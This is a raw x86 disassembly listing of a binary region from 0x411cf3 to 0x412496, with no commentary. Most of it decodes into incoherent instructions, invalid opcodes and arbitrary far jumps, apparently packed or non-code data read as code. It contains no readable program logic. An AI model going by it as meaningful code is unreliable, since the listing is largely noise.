  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x1a66579e
  411cfd:	into   
  411cfe:	(bad)  
  411cff:	loope  0x411d7f
  411d01:	gs js  0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	push   ebx
  411d09:	or     esi,ecx
  411d0b:	xchg   ebx,eax
  411d0c:	out    0x55,al
  411d0e:	mov    edx,edx
  411d10:	jle    0x411ca6
  411d12:	and    DWORD PTR [eax+0x24],ebx
  411d15:	enter  0x765d,0x7
  411d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d1a:	xchg   ecx,eax
  411d1b:	jno    0x411d04
  411d1d:	add    eax,0xbfa5d1e0
  411d22:	rcl    BYTE PTR [ecx-0x4b],cl
  411d25:	xchg   al,dl
  411d27:	jno    0x411ce7
  411d29:	mov    ch,0xf1
  411d2b:	adc    al,0xed
  411d2d:	pop    esi
  411d2e:	cmp    al,0xb6
  411d30:	in     eax,dx
  411d31:	jnp    0x411d1a
  411d33:	xchg   edx,eax
  411d34:	stc    
  411d35:	or     BYTE PTR [ecx-0x2d],0x92
  411d39:	cdq    
  411d3a:	sbb    DWORD PTR [edi-0xd8b9561],eax
  411d40:	mov    ebp,0x4a644473
  411d45:	mov    ah,0xad
  411d47:	outs   dx,BYTE PTR ds:[esi]
  411d48:	popa   
  411d49:	lods   eax,DWORD PTR ds:[esi]
  411d4a:	inc    ebp
  411d4b:	sub    eax,0x8f855944
  411d50:	cmp    BYTE PTR [eax],al
  411d52:	jl     0x411cf9
  411d54:	inc    ebx
  411d55:	mov    cl,0x72
  411d57:	and    ch,0x1e
  411d5a:	daa    
  411d5b:	inc    eax
  411d5c:	mov    cl,0x82
  411d5e:	xchg   edi,eax
  411d5f:	pop    eax
  411d61:	popa   
  411d62:	popf   
  411d63:	cld    
  411d64:	shr    DWORD PTR [ebp+0x554d14f],1
  411d6a:	jl     0x411de8
  411d6c:	stc    
  411d6d:	mov    cl,0x35
  411d6f:	lds    ecx,FWORD PTR [edi]
  411d71:	xchg   edx,eax
  411d72:	pop    ds
  411d73:	(bad)  
  411d74:	jmp    0x447737d0
  411d79:	sub    edx,DWORD PTR [ecx+0x25]
  411d7c:	sbb    al,0xb9
  411d7e:	mov    esi,0x371a33db
  411d83:	das    
  411d84:	mov    WORD PTR [ecx+ecx*2-0x6f6a758d],cs
  411d8b:	(bad)  
  411d8c:	aad    0x70
  411d8e:	xchg   edx,eax
  411d8f:	dec    esp
  411d90:	inc    ebp
  411d91:	sub    eax,0x7cbf0a50
  411d96:	or     al,0xba
  411d98:	push   esp
  411d99:	dec    ebx
  411d9a:	push   fs
  411d9c:	mov    ah,0x0
  411d9e:	test   BYTE PTR [ebx+esi*2],dh
  411da1:	sbb    eax,0x8c042b4a
  411da6:	int    0x7f
  411da8:	mov    ebp,DWORD PTR [edi]
  411daa:	adc    ah,BYTE PTR [ebx]
  411dac:	sub    al,0x1b
  411dae:	mov    ds:0xec51ab47,al
  411db3:	xchg   DWORD PTR [esp+ebp*1-0x6b],esp
  411db7:	outs   dx,BYTE PTR ds:[esi]
  411db8:	ds addr16 push edi
  411dbb:	sub    BYTE PTR [bx],ch
  411dbe:	add    eax,0xe224bf11
  411dc3:	jp     0x411e37
  411dc5:	sub    esi,DWORD PTR [ecx]
  411dc7:	xchg   ecx,eax
  411dc8:	out    dx,al
  411dc9:	out    dx,eax
  411dca:	xor    cl,BYTE PTR [eax-0x5a]
  411dcd:	jae    0x411daa
  411dcf:	mov    WORD PTR [esi+0x29],?
  411dd2:	push   ebp
  411dd3:	jp     0x411e24
  411dd5:	xchg   DWORD PTR [esi-0x32],eax
  411dd8:	shr    DWORD PTR [ebp-0x5caa42aa],0x58
  411ddf:	iret   
  411de0:	ins    BYTE PTR es:[edi],dx
  411de1:	sbb    al,0xf4
  411de3:	add    DWORD PTR ds:0xa70dcc08,esi
  411de9:	xor    ebp,DWORD PTR [eax]
  411deb:	(bad)  
  411dec:	mov    ebx,0xee7f6660
  411df1:	outs   dx,DWORD PTR ds:[esi]
  411df2:	mov    bh,BYTE PTR [ebx-0x27]
  411df5:	pop    ss
  411df6:	inc    esi
  411df7:	jp     0x411db6
  411df9:	fwait
  411dfa:	inc    edx
  411dfb:	xchg   esp,eax
  411dfc:	push   edx
  411dfd:	mov    eax,esi
  411dff:	pop    es
  411e00:	jnp    0x411dda
  411e02:	push   ecx
  411e03:	mov    ah,0x86
  411e05:	sbb    BYTE PTR [edx],0xc8
  411e08:	pusha  
  411e09:	push   ds
  411e0a:	pushf  
  411e0b:	pop    eax
  411e0c:	aam    0xa5
  411e0e:	loop   0x411dc1
  411e10:	stos   BYTE PTR es:[edi],al
  411e11:	push   ebp
  411e12:	mov    eax,DWORD PTR [ebx+eax*1-0x6cd2183a]
  411e19:	push   es
  411e1a:	stos   DWORD PTR es:[edi],eax
  411e1b:	mov    ebp,0xfa48fee0
  411e20:	ins    DWORD PTR es:[edi],dx
  411e21:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e23:	jno    0x411e7b
  411e25:	scas   al,BYTE PTR es:[edi]
  411e26:	dec    ebx
  411e27:	adc    esp,eax
  411e29:	cwde   
  411e2a:	fisttp WORD PTR [eax]
  411e2c:	cdq    
  411e2d:	xor    eax,DWORD PTR [esi+0x78]
  411e30:	mov    edx,0x67180b80
  411e35:	out    dx,eax
  411e36:	retf   0xd444
  411e39:	add    bl,BYTE PTR [edx-0x25]
  411e3c:	pop    ds
  411e3d:	mov    al,ds:0xdbc8c07d
  411e42:	pop    ebx
  411e43:	push   ecx
  411e44:	sbb    eax,0x89e1b6b8
  411e49:	lock scas al,BYTE PTR es:[edi]
  411e4b:	sbb    esi,DWORD PTR ds:0xb97cf3ab
  411e51:	pop    ecx
  411e52:	mov    eax,0xa8b203fb
  411e57:	mov    ch,0x2a
  411e59:	mov    ah,0x5f
  411e5b:	test   eax,0x6d6528ed
  411e60:	pop    es
  411e61:	mov    ds:0x30454ae3,al
  411e66:	ins    BYTE PTR es:[edi],dx
  411e67:	add    cl,dl
  411e69:	lock jmp 0x411e6d
  411e6c:	popa   
  411e6d:	add    DWORD PTR [edi-0x75],ebp
  411e70:	in     eax,0x26
  411e72:	push   cs
  411e73:	cld    
  411e74:	test   eax,0xc4c0aa9d
  411e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7a:	dec    esi
  411e7b:	aad    0x5a
  411e7d:	imul   edx,DWORD PTR [eax-0x10],0xbb6b4129
  411e84:	scas   al,BYTE PTR es:[edi]
  411e85:	mov    al,cs:0xeaa7ad4e
  411e8b:	xchg   esi,eax
  411e8c:	test   BYTE PTR [eax+0x6db4e72b],0x5f
  411e93:	mov    bl,0xb3
  411e95:	(bad)  
  411e97:	cld    
  411e98:	(bad)  
  411e99:	call   0x39dda9e1
  411e9e:	mov    ebx,0x53f941e5
  411ea3:	xor    ax,0x9b96
  411ea7:	adc    al,0xf0
  411ea9:	dec    ebx
  411eaa:	pop    esp
  411eab:	mov    ebp,0x7d0a3340
  411eb0:	sub    al,0xe5
  411eb2:	fld    TBYTE PTR [ecx-0x7d79e0d7]
  411eb8:	pop    edx
  411eb9:	mov    edi,0xf74edabe
  411ebe:	loop   0x411ea3
  411ec0:	jecxz  0x411e52
  411ec2:	adc    BYTE PTR [esi+ebp*8+0x5d],cl
  411ec6:	in     al,dx
  411ec7:	mov    bl,0xc1
  411ec9:	(bad)  
  411eca:	scas   eax,DWORD PTR es:[edi]
  411ecb:	xor    esp,DWORD PTR [edx+0x11]
  411ece:	cwde   
  411ecf:	test   DWORD PTR [ebx-0xdbdcd4f],ecx
  411ed5:	sbb    dh,BYTE PTR [ebx]
  411ed7:	and    eax,0x4d5c4c63
  411edc:	add    eax,0x4c89c971
  411ee1:	sub    BYTE PTR [esi],al
  411ee3:	imul   esp,eax,0x1823c039
  411ee9:	fisubr DWORD PTR [edi+eiz*8+0x10938f1c]
  411ef0:	cmp    BYTE PTR [edx],al
  411ef2:	cmp    al,0xb9
  411ef4:	ret    
  411ef5:	xchg   esi,eax
  411ef6:	(bad)
  411ef9:	dec    esi
  411efa:	jecxz  0x411e80
  411efc:	ja     0x411efd
  411efe:	leave  
  411eff:	xchg   edx,eax
  411f00:	pop    edi
  411f02:	pop    esp
  411f03:	lds    eax,FWORD PTR [ebx+eiz*2+0x14]
  411f07:	mov    al,ds:0x95ac549b
  411f0c:	cmp    al,0x55
  411f0e:	and    bh,BYTE PTR [eax+0x6645b673]
  411f14:	xlat   BYTE PTR ds:[ebx]
  411f15:	pusha  
  411f16:	scas   eax,DWORD PTR es:[edi]
  411f17:	out    dx,al
  411f18:	imul   BYTE PTR ds:0xdfaa7b31
  411f1e:	add    eax,0xdadbb218
  411f23:	inc    edi
  411f24:	lods   eax,DWORD PTR ds:[esi]
  411f25:	movzx  ecx,WORD PTR [edi-0xf141152]
  411f2c:	push   cs
  411f2d:	dec    ebp
  411f2e:	push   0xffffffe5
  411f30:	inc    ebp
  411f31:	mov    ebx,0x1308b030
  411f36:	sub    BYTE PTR [edx],al
  411f38:	jg     0x411fab
  411f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f3b:	pop    ebp
  411f3c:	ins    BYTE PTR es:[edi],dx
  411f3d:	outs   dx,BYTE PTR ds:[esi]
  411f3e:	pushf  
  411f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f40:	xchg   edx,eax
  411f41:	and    eax,0xf17437f8
  411f46:	jae    0x411f5e
  411f48:	imul   edx,DWORD PTR [edi],0x7630b3ba
  411f4e:	xor    al,0xce
  411f50:	mov    dh,0xb0
  411f52:	adc    eax,0xc1b4c454
  411f57:	sub    DWORD PTR [eax+0x25],esi
  411f5a:	cmp    dl,BYTE PTR [eax-0x5]
  411f5d:	add    bl,BYTE PTR [ebp+0x4d]
  411f60:	mov    ebp,0x12e14099
  411f65:	inc    eax
  411f66:	add    BYTE PTR [edi+0x19],bl
  411f69:	add    dl,BYTE PTR [edi-0x59c5a83e]
  411f6f:	pop    esp
  411f70:	mov    edi,0x558b998d
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	test   DWORD PTR [esi+eax*4+0x1b],edx
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	rcl    DWORD PTR [ebx],0x1c
  411f9d:	push   ecx
  411f9e:	mov    al,ds:0x1570ff53
  411fa3:	in     eax,0x5e
  411fa5:	xchg   esi,eax
  411fa6:	jecxz  0x411f88
  411fa8:	shl    BYTE PTR [esi-0x6c],0x15
  411fac:	or     ebp,edx
  411fae:	in     eax,dx
  411faf:	cmp    eax,0x76ba08e4
  411fb4:	aad    0x53
  411fb6:	xchg   ecx,eax
  411fb7:	ins    BYTE PTR es:[edi],dx
  411fb8:	clc    
  411fb9:	xor    eax,0xdb2dc443
  411fbe:	sti    
  411fbf:	cwde   
  411fc0:	jno    0x411fea
  411fc2:	xchg   ecx,eax
  411fc3:	mov    ebp,0x3948a866
  411fc8:	out    dx,eax
  411fc9:	push   0xffffffa5
  411fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fcc:	pushf  
  411fcd:	loopne 0x412045
  411fcf:	and    al,0x42
  411fd1:	xchg   ecx,eax
  411fd2:	and    DWORD PTR [edi+edx*4],esi
  411fd5:	jge    0x411f8c
  411fd7:	fwait
  411fd8:	adc    BYTE PTR ds:0x2d5f6678,dh
  411fde:	mov    edx,0x81b7e654
  411fe3:	out    0xe5,al
  411fe5:	sub    cl,BYTE PTR [edi]
  411fe7:	mov    bl,0xbd
  411fe9:	(bad)  [edx]
  411feb:	stos   DWORD PTR es:[edi],eax
  411fec:	popf   
  411fed:	inc    esi
  411fee:	mov    edi,DWORD PTR [edx]
  411ff0:	lds    edx,FWORD PTR [ebx+0x1c]
  411ff3:	push   es
  411ff4:	iret   
  411ff5:	shl    BYTE PTR [edi+eiz*4-0x7e],0xfe
  411ffa:	sub    al,0xc2
  411ffc:	push   0x28
  411ffe:	ja     0x411fa6
  412000:	and    eax,0x37c5ae5c
  412005:	scas   eax,DWORD PTR es:[edi]
  412006:	nop
  412007:	fidivr DWORD PTR [edx-0x36]
  41200a:	ror    DWORD PTR [edx],0x54
  41200d:	outs   dx,DWORD PTR ds:[esi]
  41200e:	mov    edx,0x8cebaf2b
  412013:	(bad)  
  412014:	leave  
  412015:	mov    edi,0x6f37c4a3
  41201a:	and    DWORD PTR [edx],ebx
  41201c:	and    eax,0x9fc6c5ad
  412021:	aas    
  412022:	addr16 jmp 0x57e3:0x106ec7c2
  41202a:	jle    0x412092
  41202c:	rol    BYTE PTR [ecx-0x4f916dda],1
  412032:	shr    ebp,1
  412034:	push   cs
  412035:	scas   eax,DWORD PTR es:[edi]
  412036:	pop    esi
  412037:	xlat   BYTE PTR ds:[ebx]
  412038:	jp     0x412014
  41203a:	(bad)  
  41203b:	in     eax,dx
  41203c:	dec    ebp
  41203d:	das    
  41203e:	pop    DWORD PTR [edi+0x44654e60]
  412044:	ins    DWORD PTR es:[edi],dx
  412045:	addr16 inc esi
  412047:	int    0x3d
  412049:	ret    0x6c0f
  41204c:	imul   ebp,DWORD PTR [ecx+edi*1],0xffffffc8
  412050:	test   BYTE PTR [ebp+0x30c735a7],0x38
  412057:	test   DWORD PTR [ecx],0x2e8688f0
  41205d:	jns    0x4120bf
  41205f:	scas   al,BYTE PTR es:[edi]
  412060:	rol    al,cl
  412062:	adc    eax,0xe83480d2
  412067:	inc    edx
  412068:	inc    edx
  412069:	test   DWORD PTR [ebx-0x1b7cb05c],esi
  41206f:	xchg   ecx,eax
  412070:	lds    esp,FWORD PTR [edi]
  412072:	dec    ecx
  412073:	sub    al,0xaf
  412075:	sbb    al,0x38
  412077:	xor    BYTE PTR [ecx+0x50b52963],al
  41207d:	adc    eax,0x3d109899
  412082:	or     BYTE PTR [ebp+0x6d],ah
  412085:	push   0xd48481a4
  41208a:	dec    esp
  41208b:	jae    0x412038
  41208d:	sbb    ecx,edx
  41208f:	mov    ah,0x1a
  412091:	je     0x4120c2
  412093:	sub    DWORD PTR [esp+edx*1],ebp
  412096:	mov    al,0x7e
  412098:	pop    ds
  412099:	jge    0x4120b5
  41209b:	inc    ebx
  41209c:	icebp  
  41209d:	or     esp,edi
  41209f:	sub    ch,ch
  4120a1:	loop   0x412048
  4120a3:	repnz push ebx
  4120a5:	aaa    
  4120a6:	outs   dx,DWORD PTR ds:[esi]
  4120a7:	dec    eax
  4120a8:	cmp    al,0x76
  4120aa:	xor    DWORD PTR [ecx],esp
  4120ac:	sbb    eax,0xc0c02a
  4120b1:	out    dx,al
  4120b2:	mov    al,0x61
  4120b4:	lods   al,BYTE PTR ds:[esi]
  4120b5:	xor    BYTE PTR [edx],ah
  4120b7:	loop   0x4120ca
  4120b9:	pop    esp
  4120ba:	data16 xor al,0xfb
  4120bd:	movzx  esp,ax
  4120c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120c1:	retf   
  4120c2:	xchg   BYTE PTR [ebp-0x4c6ad39e],al
  4120c8:	fwait
  4120c9:	out    0x29,al
  4120cb:	imul   edi,DWORD PTR [ecx-0x3a6b9050],0xffffff8a
  4120d2:	jmp    0x3a6e:0x3d8c7273
  4120d9:	cmp    dh,bl
  4120db:	mov    esp,0x84a0d1f2
  4120e0:	sti    
  4120e1:	or     BYTE PTR [esi-0x2],cl
  4120e4:	pop    edi
  4120e5:	enter  0xfb91,0xe
  4120e9:	dec    ecx
  4120ea:	js     0x41214e
  4120ec:	popf   
  4120ed:	test   BYTE PTR [edx+0x1f30a7af],0xf8
  4120f4:	add    DWORD PTR [ecx],eax
  4120f6:	(bad)  
  4120f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f8:	mov    BYTE PTR ds:0x621075ea,dl
  4120fe:	daa    
  4120ff:	pop    esi
  412100:	pop    ecx
  412101:	mov    edx,0x33acf516
  412106:	xor    al,0xf5
  412108:	retf   0x6940
  41210b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210c:	mov    esi,0x63953437
  412111:	lds    edi,FWORD PTR [ebp-0x23]
  412114:	popa   
  412115:	cmp    ecx,DWORD PTR [ebx+ebx*8]
  412118:	rcl    BYTE PTR [esp+ebp*1],0x6f
  41211c:	stc    
  41211d:	sub    cl,0x55
  412120:	gs aad 0x95
  412123:	and    eax,DWORD PTR [edx]
  412125:	pop    eax
  412126:	retf   
  412127:	call   0xba83d409
  41212c:	outs   dx,BYTE PTR ds:[esi]
  41212d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212e:	scas   al,BYTE PTR es:[edi]
  41212f:	imul   eax,esi,0xd2622ac7
  412135:	mov    edi,0x22982f1a
  41213a:	aas    
  41213b:	hlt    
  41213c:	repz xchg ebp,eax
  41213e:	mov    bl,al
  412140:	xlat   BYTE PTR ds:[ebx]
  412141:	xchg   ebx,eax
  412142:	mov    edx,0x4906b64f
  412147:	arpl   WORD PTR [edi+0x32e06c25],si
  41214d:	jp     0x41216b
  41214f:	(bad)  
  412150:	sub    eax,0x220fe91b
  412155:	dec    esi
  412156:	dec    ecx
  412157:	ds sbb al,0x5b
  41215a:	push   ebp
  41215b:	retf   
  41215c:	fidivr DWORD PTR [edi+0xb]
  41215f:	(bad)  
  412160:	fisttp WORD PTR [eax+0x76afb20f]
  412166:	mov    esi,0x92e77809
  41216b:	int    0xb
  41216d:	adc    BYTE PTR [eax],0xd2
  412170:	push   ebp
  412171:	sub    BYTE PTR [esi+0xf6a7ae7],cl
  412177:	jge    0x41218c
  412179:	add    DWORD PTR [esi],eax
  41217b:	mul    BYTE PTR [esi+0x1c]
  41217e:	(bad)  
  41217f:	cmc    
  412180:	(bad)  
  412181:	push   edi
  412182:	or     al,0xb6
  412184:	jecxz  0x41214a
  412186:	ret    0x4ab
  412189:	data16 cld 
  41218b:	xchg   esp,eax
  41218c:	pushf  
  41218d:	out    0xad,al
  41218f:	sub    al,0xa
  412191:	xchg   BYTE PTR [ecx+0x38095a9e],cl
  412197:	pop    esi
  412198:	jns    0x4121e2
  41219a:	mov    ebx,ebp
  41219c:	(bad)  
  41219d:	into   
  41219e:	(bad)  
  41219f:	jb     0x41219c
  4121a1:	arpl   WORD PTR [edx+ebx*1-0x7a59dee1],bp
  4121a8:	and    al,0x30
  4121aa:	mov    DWORD PTR [edi+0x0],edi
  4121ad:	sub    DWORD PTR [ecx+eiz*2+0x28],edx
  4121b1:	add    ecx,0xe5fcdb4e
  4121b7:	push   0x2c95a070
  4121bc:	in     al,0xfe
  4121be:	cmp    BYTE PTR [ebx],dh
  4121c0:	xchg   ebp,eax
  4121c1:	pop    ecx
  4121c2:	icebp  
  4121c3:	stos   BYTE PTR es:[edi],al
  4121c4:	stc    
  4121c5:	stc    
  4121c6:	in     al,0x18
  4121c8:	or     ecx,DWORD PTR [edx]
  4121ca:	jg     0x41220e
  4121cc:	int    0x2e
  4121ce:	aas    
  4121cf:	hlt    
  4121d0:	jns    0x412189
  4121d2:	adc    cl,BYTE PTR [eax+eiz*1+0x6]
  4121d6:	cmp    dh,BYTE PTR [ecx]
  4121d8:	pop    edi
  4121d9:	adc    DWORD PTR [esi-0x790dfd7],esi
  4121df:	xor    edi,DWORD PTR [eax-0x6984da1a]
  4121e5:	xchg   ebp,eax
  4121e6:	ins    BYTE PTR es:[edi],dx
  4121e7:	xchg   esp,eax
  4121e8:	aaa    
  4121e9:	pop    eax
  4121ea:	mov    edx,0x42daf46e
  4121ef:	rcl    BYTE PTR [edx],1
  4121f1:	mov    esp,es
  4121f3:	mov    bh,0xdc
  4121f5:	les    esi,FWORD PTR [edi+0x5b29fe74]
  4121fb:	repnz xor ch,cl
  4121fe:	add    eax,0xe7961e2d
  412203:	inc    ecx
  412204:	cmp    DWORD PTR [ebx],eax
  412206:	stc    
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	mov    esp,0x5096fc0c
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412240:	and    DWORD PTR [ebp-0xf11c05c],edx
  412246:	and    dl,BYTE PTR [ebx-0x40]
  412249:	in     al,0xdb
  41224b:	pop    edx
  41224c:	jbe    0x4122be
  41224e:	sbb    al,0x49
  412250:	outs   dx,BYTE PTR ds:[esi]
  412251:	dec    ecx
  412252:	outs   dx,DWORD PTR ds:[esi]
  412253:	(bad)  
  412255:	push   edx
  412256:	rol    BYTE PTR [ebp+0x7235df92],cl
  41225c:	loop   0x41229a
  41225e:	cmp    bh,BYTE PTR [edi+0x6d6bea4d]
  412264:	retf   0xc23e
  412267:	ins    BYTE PTR es:[edi],dx
  412268:	loop   0x412266
  41226a:	mov    dl,0x78
  41226c:	push   ebx
  41226d:	cmp    DWORD PTR [edi+0x5ce36008],esp
  412273:	jecxz  0x412232
  412275:	sub    ebx,DWORD PTR [eax+0x1e]
  412278:	mov    esi,0x53b05dfc
  41227d:	retf   
  41227e:	jmp    0x91d:0x91c1b810
  412285:	icebp  
  412286:	js     0x412295
  412288:	lea    edx,ds:0x300f1b8c
  41228e:	push   0xa0f3c18
  412293:	lahf   
  412294:	mov    ebp,0x6417262f
  412299:	cdq    
  41229a:	xchg   edx,eax
  41229b:	(bad)  
  41229c:	or     eax,0xb280f341
  4122a1:	mov    ebp,0xe9943924
  4122a6:	(bad)  
  4122a7:	cli    
  4122a8:	mov    ds:0x64b62284,eax
  4122ad:	enter  0xd7f3,0xd8
  4122b1:	and    BYTE PTR [ebx],al
  4122b3:	ffree  st(1)
  4122b5:	sbb    BYTE PTR [edx+0x5f142ca],bh
  4122bb:	rcr    DWORD PTR [edi+0x69c0ed0],0x51
  4122c2:	inc    edi
  4122c3:	loop   0x41233a
  4122c5:	push   0x11
  4122c7:	mov    dh,BYTE PTR [ecx+0x48a8a5ff]
  4122cd:	xchg   esi,eax
  4122ce:	mul    BYTE PTR [esi-0x1ccb60aa]
  4122d4:	sbb    DWORD PTR [eax-0x50],ecx
  4122d7:	jmp    0x4122a6
  4122d9:	and    BYTE PTR ds:0x40882e55,ch
  4122df:	sbb    eax,0x77d05010
  4122e4:	aaa    
  4122e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122e6:	test   DWORD PTR [edx+eax*2],0x9cf89f4c
  4122ed:	jae    0x412358
  4122ef:	sbb    al,0x74
  4122f1:	and    al,0x20
  4122f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122f4:	into   
  4122f5:	pop    eax
  4122f6:	ins    BYTE PTR es:[edi],dx
  4122f7:	and    al,0x5e
  4122f9:	or     esi,DWORD PTR [ebx]
  4122fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122fc:	outs   dx,DWORD PTR ds:[esi]
  4122fd:	adc    BYTE PTR ss:[edx],bh
  412300:	sar    ch,1
  412302:	sahf   
  412303:	fisub  WORD PTR [ecx-0x35]
  412306:	or     BYTE PTR [edx+eax*8-0x2990dcc8],al
  41230d:	repz pop ecx
  41230f:	push   edx
  412310:	cmp    DWORD PTR [ecx+0x3ff4a20c],ebp
  412316:	addr16 cs (bad) 
  412319:	loop   0x412331
  41231b:	push   ss
  41231c:	dec    esp
  41231d:	xor    BYTE PTR [ebx-0x68634d33],al
  412323:	push   esp
  412324:	adc    BYTE PTR [ebx+0x79],al
  412327:	push   esp
  412328:	mov    dl,0x47
  41232a:	sbb    edi,esp
  41232c:	push   eax
  41232d:	nop
  41232e:	in     eax,dx
  41232f:	or     eax,0xcbe7d520
  412334:	inc    ebp
  412335:	ins    DWORD PTR es:[edi],dx
  412336:	loop   0x41235c
  412338:	mov    ecx,0x32162389
  41233d:	dec    ecx
  41233e:	lds    eax,FWORD PTR [edx]
  412340:	fdivr  DWORD PTR [esi-0x1f]
  412343:	outs   dx,DWORD PTR ds:[esi]
  412344:	push   ebx
  412345:	in     eax,0xdd
  412347:	popa   
  412348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412349:	push   eax
  41234a:	int3   
  41234b:	cmovge ebp,DWORD PTR [ebx-0x23051d8a]
  412352:	cli    
  412353:	out    0x9a,eax
  412355:	and    BYTE PTR [ecx],bh
  412357:	jne    0x41234c
  412359:	jo     0x412328
  41235b:	mov    dh,0x6c
  41235d:	popa   
  41235e:	cwde   
  41235f:	jmp    0xe785:0xc893481e
  412366:	cwde   
  412367:	xchg   edi,eax
  412368:	enter  0x1494,0x8d
  41236c:	pop    ss
  41236d:	dec    ebp
  41236e:	xor    BYTE PTR [edi-0xb],ah
  412371:	imul   edx,DWORD PTR [eax],0x1d
  412374:	js     0x412390
  412376:	ins    BYTE PTR es:[edi],dx
  412377:	repz jbe 0x4123b5
  41237a:	mov    ds:0x12c70b55,eax
  41237f:	jmp    0x4b3d:0x4d5599ae
  412386:	pusha  
  412387:	les    ebx,FWORD PTR [ebp+0x731a5a3c]
  41238d:	ret    0x45f2
  412390:	nop
  412391:	mov    ebx,0x431bdd3
  412396:	inc    ecx
  412397:	(bad)  
  412398:	(bad)
  41239b:	mov    ah,0x87
  41239d:	mov    ecx,0x3c949e89
  4123a2:	imul   esp,edi,0xf78e4c31
  4123a8:	ror    edx,1
  4123aa:	mov    al,ds:0xaa0a31ee
  4123af:	sbb    al,ah
  4123b1:	test   DWORD PTR ds:0x4fc146c3,esi
  4123b7:	sub    DWORD PTR [eax+0x360dcc26],ecx
  4123bd:	lahf   
  4123be:	bsf    ebp,DWORD PTR [eax]
  4123c1:	xor    esp,DWORD PTR [edx]
  4123c3:	pop    ds
  4123c4:	jl     0x4123d5
  4123c6:	push   ebx
  4123c7:	jnp    0x4123d8
  4123c9:	call   0xec2a:0x9cb7e446
  4123d0:	push   ebp
  4123d1:	and    BYTE PTR [eax],al
  4123d3:	lods   eax,DWORD PTR ds:[esi]
  4123d4:	cli    
  4123d5:	dec    BYTE PTR [ebp+0x46549dfa]
  4123db:	jmp    0x6089:0x734d752d
  4123e2:	shl    esi,0x12
  4123e5:	dec    edi
  4123e6:	jg     0x412373
  4123e8:	adc    DWORD PTR [esi+edx*8-0x1a4a73de],0x7d
  4123f0:	lods   eax,DWORD PTR ds:[esi]
  4123f1:	stos   BYTE PTR es:[edi],al
  4123f2:	and    dh,BYTE PTR [eax+0x65]
  4123f5:	into   
  4123f6:	div    esp
  4123f8:	add    dl,al
  4123fa:	mov    ?,WORD PTR [ebx-0x57646432]
  412400:	(bad)  [edx]
  412402:	lock xchg esp,eax
  412404:	sti    
  412405:	stos   DWORD PTR es:[edi],eax
  412406:	es nop
  412408:	in     al,0xf7
  41240a:	cvtps2pi mm6,QWORD PTR [ecx+0x36562331]
  412411:	stos   BYTE PTR es:[edi],al
  412412:	jae    0x412436
  412414:	test   BYTE PTR [edi-0x7a],dl
  412417:	out    0x7f,eax
  412419:	sahf   
  41241a:	mov    ds,ebx
  41241c:	call   0x1e1c:0xf5a546eb
  412423:	push   edx
  412424:	or     al,0x7c
  412426:	imul   esp,edi,0x9
  412429:	inc    ebx
  41242a:	aam    0x4a
  41242c:	inc    edx
  41242d:	pop    ebp
  41242e:	mov    cs,WORD PTR [ebx]
  412430:	cs inc ecx
  412432:	jp     0x4123da
  412434:	xchg   esp,eax
  412435:	je     0x4123c0
  412437:	add    esp,DWORD PTR [edi-0x6d]
  41243a:	jb     0x412436
  41243c:	xchg   ebx,eax
  41243d:	and    al,0xb4
  41243f:	or     eax,0x8473e6d4
  412444:	test   DWORD PTR [ebp+edi*1-0x429ad63],edi
  41244b:	ret    0x6a79
  41244e:	xor    eax,0xf5622841
  412453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412454:	mov    WORD PTR [edi+0x3cb026a7],?
  41245a:	pop    edx
  41245b:	icebp  
  41245c:	ins    BYTE PTR es:[edi],dx
  41245d:	mov    ebp,0x7f6a0848
  412462:	loop   0x4124b5
  412464:	sub    DWORD PTR [edx],edx
  412466:	(bad)  [edx+0x14]
  412469:	fadd   QWORD PTR [ebx+0x63dcd448]
  41246f:	mov    bh,0x8e
  412471:	test   eax,0x68c5944d
  412476:	sub    al,0x7e
  412478:	add    al,0x1c
  41247a:	sar    edx,1
  41247c:	data16 (bad) 
  41247e:	(bad)  [edi]
  412480:	fimul  WORD PTR [ebp-0x46]
  412483:	adc    bl,ch
  412485:	lds    ebx,FWORD PTR [esi-0x52]
  412488:	pop    edx
  412489:	jo     0x412447
  41248b:	xchg   esp,edi
  41248d:	fwait
  41248e:	in     al,dx
  41248f:	loope  0x41241e
  412491:	adc    BYTE PTR [ebx],dl
  412493:	mov    ?,ebx
  412495:	cld    
  412496:	add    al,bl
